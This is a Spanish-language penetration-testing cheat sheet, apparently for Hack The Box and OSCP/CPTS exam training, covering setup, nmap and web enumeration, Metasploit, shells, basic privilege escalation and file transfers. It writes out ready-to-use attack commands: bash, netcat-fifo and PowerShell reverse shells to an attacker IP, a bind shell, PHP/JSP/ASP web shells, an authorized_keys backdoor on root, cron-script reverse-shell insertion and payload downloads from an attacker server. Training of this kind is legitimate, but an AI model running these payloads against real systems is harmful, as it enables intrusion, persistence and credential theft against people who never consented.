---
title: "Getting Started"
description: "Setup base, herramientas y workflow inicial para auditorías ofensivas."
sidebar:
  order: 2
  label: "Getting Started"
---
> Módulo de arranque: setup del entorno de trabajo, herramientas esenciales, reconocimiento inicial, tipos de shell y escalada de privilegios básica. La base operativa sobre la que se construyen todos los demás módulos.

---


## Herramientas base — Setup y uso

### SSH

```bash
ssh usuario@10.10.10.10
ssh root@10.10.10.10 -i id_rsa   # clave privada robada (chmod 600 id_rsa primero)
```

### Netcat / Socat

```bash
nc -nv 10.10.10.10 22            # banner grabbing manual
nc -lvnp 1234                    # listener para reverse shell
```

| Flag | Uso |
|------|-----|
| `-l` | Modo listen |
| `-v` | Verbose |
| `-n` | Sin DNS |
| `-p` | Puerto |

### tmux — atajos esenciales

```
tmux                  # iniciar sesión
CTRL+B → C            # nueva ventana
CTRL+B → 0/1/2        # cambiar ventana
CTRL+B → SHIFT+%      # split vertical
CTRL+B → SHIFT+"      # split horizontal
CTRL+B → flechas      # navegar entre panes
```

### Vim — atajos rápidos

```
i           # insert mode
ESC         # volver a normal mode
:w          # guardar
:q!         # salir sin guardar
:wq         # guardar y salir
dd / yy / p # cortar línea / copiar línea / pegar
```

---

## VPN — Conexión a HTB

```bash
sudo openvpn user.ovpn
ip a                             # verificar tun0 con IP 10.10.x.x
netstat -rn                      # ver rutas (10.129.0.0/16 vía tun0)
ifconfig tun0                    # verificar interfaz VPN
```

> ⚠️ Siempre desde una VM limpia. No usar la misma VM que para clientes reales.

---

## Reconocimiento de Servicios (Nmap)

### Scans básicos

```bash
nmap 10.129.42.253                                  # top 1000 TCP
nmap -sV --open -oA scan_inicial 10.129.42.190      # versiones + guardar outputs
nmap -sV -sC -p- 10.129.42.253                      # full TCP + scripts default
nmap -sC -p 22,80 -oA nibbles_script 10.129.42.190  # scripts en puertos específicos
nmap -A -p445 10.129.42.253                         # OS + versión + traceroute
nmap -sV --script=banner -p21 10.10.10.0/24         # banner grabbing en rango
nmap --script smb-os-discovery.nse -p445 10.10.10.40
nmap -sV --script=http-enum -oA http_enum 10.129.42.190
```

| Flag | Significado |
|------|-------------|
| `-sV` | Versión de servicios |
| `-sC` | Scripts default |
| `-p-` | Todos los puertos (65535) |
| `--open` | Solo puertos abiertos |
| `-oA` | Guardar en .nmap/.xml/.gnmap |
| `-A` | Todo: OS, versión, scripts, traceroute |

### Scripts NSE personalizados

```bash
locate scripts/citrix          # buscar scripts disponibles
nmap --script <nombre.nse> -p<puerto> <host>
```

---

## Enumeración Web

### Banner / Headers

```bash
curl -IL https://www.target.com       # headers del servidor
nc -nv 10.129.42.190 80               # banner manual HTTP
whatweb 10.10.10.121                  # fingerprint tecnologías
whatweb --no-errors 10.10.10.0/24     # barrido de rango
```

### Directory Brute-Force (Gobuster)

```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

| Código HTTP | Significado |
|-------------|-------------|
| 200 | OK — recurso accesible |
| 301 | Redirect (seguir) |
| 403 | Forbidden (interesante) |
| 404 | Not found |

### Checklist web rápida

- [ ] `robots.txt` — rutas ocultas/admin
- [ ] Código fuente (CTRL+U) — comentarios con credenciales
- [ ] Certificado SSL — emails, nombres de empresa
- [ ] Headers HTTP — versiones, frameworks
- [ ] Subdominios — gobuster dns

### FTP anónimo

```bash
nmap -sC -sV -p21 <IP>          # verificar ftp-anon
ftp -p <IP>
> Name: anonymous
> ls / cd pub / get archivo.txt
```

### SMB

```bash
smbclient -N -L \\\\<IP>                  # listar shares sin auth
smbclient -U usuario \\\\<IP>\\share     # conectar con credenciales
> ls / cd carpeta / get archivo.txt
nmap --script smb-os-discovery.nse -p445 <IP>
```

### SNMP

```bash
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.5.0   # hostname
onesixtyone -c dict.txt <IP>                        # brute community strings
```

---

## Búsqueda de Exploits

```bash
sudo apt install exploitdb -y
searchsploit openssh 7.2
searchsploit -x linux/remote/45233.py   # ver exploit sin abrir
```

**Bases de datos online:** ExploitDB · Rapid7 DB · Vulnerability Lab

### Metasploit — flujo básico

```bash
msfconsole
msf6 > search exploit eternalblue
msf6 > search cve:2009 type:exploit       # filtros avanzados
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > show options
msf6 > set RHOSTS 10.10.10.40
msf6 > set LHOST tun0
msf6 > check                              # verificar vulnerabilidad antes de explotar
msf6 > exploit                            # o: run
meterpreter > getuid
meterpreter > shell
```

---

## Tipos de Shell

### Reverse Shell (más común)

```bash
# Listener en atacante
nc -lvnp 1234

# Payload en víctima — Linux
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# Payload en víctima — Windows (PowerShell)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shell

```bash
# En víctima (escucha)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# En atacante (conectar)
nc 10.10.10.1 1234
```

### Web Shell

```php
<?php system($_REQUEST["cmd"]); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```asp
<% eval request("cmd") %>
```

**Webroots por defecto:**

| Servidor | Ruta |
|----------|------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

```bash
# Subir web shell via RCE
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

# Usar web shell
curl http://SERVER_IP/shell.php?cmd=id
```

### Upgrade de TTY (shell no interactiva → TTY completo)

```bash
# En la shell de netcat:
python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z para poner en background

# En terminal local:
stty raw -echo
fg
# Enter x2

# Ajustar tamaño (en terminal local primero):
echo $TERM          # xterm-256color
stty size           # filas columnas

# En shell remota:
export TERM=xterm-256color
stty rows 67 columns 318
```

---

## Escalada de Privilegios (Básica)

### Enumeración automática

```bash
./linpeas.sh                    # Linux — color-coded, automatizado
./winPEAS.exe                   # Windows
./seatbelt.exe -group=all       # Windows — Seatbelt
```

### Sudo

```bash
sudo -l                         # ver qué puede ejecutar el usuario actual
sudo su -                       # si tiene ALL → root
sudo -u otrouser /bin/echo test # ejecutar como otro usuario
```

> GTFOBins: buscar el binario con `sudo` para ver cómo escalar → `sudo find . -exec /bin/sh \; -quit`

### SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null     # buscar SUID
find / -perm -2000 -type f 2>/dev/null     # buscar SGID
```

### Cron Jobs

```bash
cat /etc/crontab
ls /etc/cron.d/
ls /var/spool/cron/crontabs/
# Si hay write sobre un script que ejecuta cron → insertar reverse shell
```

### Credenciales expuestas

```bash
cat /var/www/html/config.php     # contraseñas de BD
cat ~/.bash_history              # comandos anteriores
# Buscar archivos con contraseñas:
grep -r "password" /var/www/ 2>/dev/null
```

### SSH Keys

```bash
cat /home/usuario/.ssh/id_rsa    # copiar → chmod 600 id_rsa → ssh -i id_rsa
# Backdoor: añadir tu pública al host comprometido
echo "ssh-rsa AAAA...tu_clave" >> /root/.ssh/authorized_keys
ssh-keygen -f key                # generar par para implantar
```

### Software vulnerable

```bash
dpkg -l                          # software instalado en Linux
ls "C:\Program Files\"           # Windows
searchsploit <nombre> <versión>  # buscar exploit
```

---

## Transferencia de Archivos (Básico)

```bash
# Servidor HTTP en atacante
python3 -m http.server 8000

# Descargar en víctima
wget http://10.10.14.1:8000/linpeas.sh
curl http://10.10.14.1:8000/linpeas.sh -o linpeas.sh

# SCP (si hay credenciales SSH)
scp linpeas.sh usuario@10.10.10.10:/tmp/linpeas.sh

# Base64 (si no hay salida de red)
base64 shell -w 0                          # en atacante → copiar string
echo "<base64>" | base64 -d > shell       # en víctima

# Verificar integridad
md5sum shell                               # comparar en ambos lados
file shell                                 # verificar tipo de archivo
```

---

## Estructura de Carpetas para Engagements

```
Projects/
└── Cliente/
    └── EPT/
        ├── evidence/
        │   ├── credentials/
        │   ├── data/
        │   └── screenshots/
        ├── logs/
        ├── scans/
        ├── scope/
        └── tools/
```

> **Tip examen:** guarda todos los outputs de nmap con `-oA`. El timeline con timestamps es obligatorio en el reporte.

---

## Pitfalls / Gotchas

- **No olvidar `chmod 600 id_rsa`** antes de usar una clave SSH robada — el servidor rechaza claves con permisos laxos.
- **TTY sin upgrade** → sin tab-completion, sin historial, sin `su`, sin `vi`. Siempre hacer el upgrade.
- **`sudo -l` antes de linpeas** — es silencioso y suele dar acceso directo.
- **FTP anónimo** y **SNMP community `public`** son los primeros checks al ver esos puertos.
- **Web shell persiste** tras reboot; reverse/bind shell no. Si el acceso es inestable, planta web shell como backup.
- **Metasploit no funciona en el examen OSCP/CPTS para todo** — practica técnicas manuales para cada vector.
- **Password reuse** es muy común: prueba las creds de BD, FTP, o config files con `su` y `ssh`.
- La VPN de HTB va por `tun0`, no por `eth0` — asegúrate de usar la IP correcta en los payloads de reverse shell.

---

## Cheatsheets relacionados

- [Penetration Testing Process](/metodologias/fundamentos/penetration-testing-process/) — Metodología y fases del engagement
- [Network Enumeration with Nmap](/metodologias/recon/network-enumeration-nmap/) — Nmap en profundidad: NSE, timing, evasión
- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — Generación de payloads con msfvenom, shells avanzadas
- [File Transfers](/metodologias/privesc/file-transfers/) — Transferencias completas para Windows y Linux
- [Linux Privilege Escalation](/metodologias/privesc/linux-privilege-escalation/) — PrivEsc Linux detallado
- [Windows Privilege Escalation](/metodologias/privesc/windows-privilege-escalation/) — PrivEsc Windows detallado
- [Using the Metasploit Framework](/metodologias/exploitation/metasploit-framework/) — MSF completo
